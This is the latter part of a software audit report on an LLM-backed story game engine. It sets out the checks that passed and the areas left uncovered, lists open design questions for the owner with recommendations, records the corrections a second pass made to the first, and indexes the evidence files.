- **The gate.** One registry, the Job id check on every write, `Drop` for the release, and the model call outside every lock. I found no path where a stopped Job writes, and no lock held during a model call.
- **Transactions.** A record write is possible only inside a hold, through the `TxToken`. The Message and its first Swipe go in one unit on every path that I read.
- **The prompt layout.** The stable blocks are first, the changing blocks are after the history, and the history cut removes blocks, not single Messages. The trials show the result: 60 % to 80 % of the input tokens were cached.
- **The size of the story.** The narrator reads the whole story for each call (`STORY_LIMIT`). I played 1,000 Cycles on the probe with a fake model. A Cycle took 392 ms at 200 Messages and 483 ms at 2,000 Messages, in a debug build. The screen load stayed at 25 to 29 ms, the memory at 36 to 48 MB, and the database grew to 21 MB (`local-only/evidence/scaling-2000-messages.jsonl`). A real model call takes seconds, so this cost does not matter.
- **The token estimate.** The engine estimates 4 characters for each token. Against the real counts of 1,204 calls in the three trials, the estimate is between 2 % too low and 19 % too high. Its median is 2 % too high for a Quantifier call and 6 % to 9 % too high for a narrator call. So the budget is on the safe side for English and this model. Another language or another model can differ (finding llm-06 of the earlier audit).
- **The failure of a model call.** **Ran it** with an HTTP 500: the Input stays in the story with a Retry control, the status shows a failure line with Details, and a banner names the Role (`local-only/evidence/shot-05-narrator-failed.png`).
- **The API key in logs.** The log says "present" or "absent" and never the key.
- **The tests.** Line coverage was 95.2 % on 2026-10-31 (`target/crap01/llvm-cov/coverage.json`). I read four tests that I picked at random. Each one asserts a result that a player or a caller can see. In 999 recorded build runs, one test both passed and failed on the same tree: the browser test `run_story_log_edit_failure_checks`, on two trees. So the suite has little flakiness, and that test is the one to watch. The file with the lowest coverage is `response.rs` (69 %), the parser of the model answer, where finding 4 and one of the two panics of llm-07 are.
- **The phone width.** At 390 px the page has no sideways scroll, and every control is reachable (`local-only/evidence/shot-04-phone-390.png`). The story log gets half of the height.

## 7. What I did not cover

- A real provider. Every call in the probe went to a fake endpoint.
- A story with typed Inputs. The three trials are Autoplay runs.
- The look of the dashboard beyond five screenshots, and its use with a keyboard or a screen reader. The dashboard-design map has open tickets for both.
- The Python build scripts, the formal models of the gate and the text check (which is off in the shipped settings).
- The Worlds form, the Games form and the prompt preset form in a browser. I read their handlers and found nothing to report.

## 8. Questions for the owner

I did not stop for any of these. The last column says what the report assumes.

| # | Question | Why it matters | My recommendation | Assumed in this report |
|---|---|---|---|---|
| 1 | Finding 3: when a data file and the database differ for a seeded World, which one wins? | The dashboard can edit a World that also has a file. A load at boot would undo that edit | The file wins for a World that has a folder in `data/worlds/`, and the dashboard shows such a World as read-only, like a default prompt preset | Authors edit the data files (your decision of 2026-11-03) |
| 2 | Finding 4: does a cut Narration get a notice on the Swipe, or a failure line? | A failure line makes the player retry. A notice lets the player continue | A notice. The text is usable, and a Retry is one click | A notice |
| 3 | Finding 1: does your container setup need the server on all interfaces? | Commit `df7d5980` chose `0.0.0.0` on purpose | Keep `0.0.0.0` only in `build.py run`. The binary defaults to `127.0.0.1`. The `Origin` and `Host` layer is needed in both cases | The layer is the main fix |
| 4 | Finding 12: why does an Impersonate Input get an analysis? Can it go? | It changes the Room 6 to 9 times in 100 Cycles before the narrator answers, and it is one of four calls in each Cycle | Remove it. If a reason exists that I did not find, keep it but do not let it move the Room | No reason is recorded |
| 5 | Finding 11: what is a place off the map? | 40 % of the Narrations play with people and places that the engine does not know | An added Room with a name, found again by name. No picture, no description. Not a new concept | An added Room |
| 6 | Finding 11: may the model make a Character that the World does not have? | Today it can, and the engine cannot see that Character. Triggers, the sidebar and `times_met` do not apply | Decide it with the card-change ticket of the long-term-memory map. Until then, count them in the trial pack | Out of scope here |
| 7 | Finding 7: is streaming wanted before the public release? | It is the largest change to how play feels, and the largest change to the Job | Yes, after findings 1, 2 and 13. Start with its own map | Not planned |
| 8 | Finding 8: where does the database live after release? | A clean of the target dir deletes it today | A `--data-dir` flag with a default outside the build output | Open |
| 9 | Finding 10: does `llm_messages` stay a debug record (your decision of 2026-10-31)? | 50 rows are 12 Cycles, and no row names its Game or its Swipe. The link from a story entry to its call (dashboard-design ticket 11) needs both | Change the decision when that ticket is built: a Game and a Swipe on each row, and every row of the active Game | The decision stands |
| 10 | Section 5: may the four one-line fixes of the earlier audit go ahead outside the ticket order? | They wait behind grilling tickets | Yes, as one commit each with its breaking test | Open |
| 11 | Finding 14: is the present day a rule of this World, or a default that a story may leave? | If it is a rule, it must stand where the model reads it last | A rule, in the block after the history | A rule |
| 12 | Pass 1 notes: should a Retry of the opening Narration give the authored opening to the model? | Today the model writes a new opening and does not see the authored one | Small. Decide it when a World has more than one Scenario | Open |

## 9. What pass 2 corrected in pass 1

- **Finding 3** named only the Character and the Persona. The World, the map and the default prompt presets have the same fault. The owner's decision of 2026-11-03 settles the design question that pass 1 asked.
- **Finding 4** said that the transport ignores `finish_reason`. That is a tested choice of the transport. The defect is that nothing after the transport carries it.
- **Finding 9** said "5 of 9". With one more story (the trial `lt15/reference`) it is 10 of 16. Pass 1 also blamed the noise in `times_met` on the Quantifier in general. Finding 11 has the cause.
- **Finding 10** said that `role_health` reads up to 13 MB. I measured the three reads on the probe with 50 full rows: 5 to 11 ms. I removed the point.
- **Section 7 of pass 1** said that I did not measure a long story. I measured it: no problem up to 2,000 Messages (section 6).
- **The smaller item about dependencies** was from memory. It is now checked against the advisory pages.
- **Finding 10** was a defect in pass 1. It is a recorded owner decision, so it is now a question.
- **Pass 1 said that no record names the gap of finding 3.** Two records hold the fact. None treats it as a gap.

## 10. Files

- `local-only/evidence/fake_llm.py`, `local-only/evidence/fake_llm2.py`: the fake model endpoints of the two passes.
- `local-only/evidence/connection-test-answer.html`: the answer of the connection test of finding 1.
- `local-only/evidence/markdown-story-entry.html`, `local-only/evidence/truncated-story-entry.html`: the story log entries of findings 5 and 4.
- `local-only/evidence/ctrl-c-server-log.txt`: the server log of finding 2.
- `local-only/evidence/trial_db_stats.py`: the counts of findings 3 and 9 from the dev databases.
- `local-only/evidence/trial_story_stats.py` and the three `local-only/evidence/trial-*-story-stats.txt` files: the counts of findings 9, 11, 12 and 14, and the token estimate.
- `local-only/evidence/scaling_drive.py`, `local-only/evidence/scaling-2000-messages.jsonl`: the run of 1,000 Cycles.
- `local-only/evidence/shot-01` to `shot-05`: the screenshots. `shot-03` is finding 13.
- `engine-defects-and-risks-notes.md`: the working notes, with the commands of the probes.
- `audit-catalogue.md`: the other audits that are worth doing.
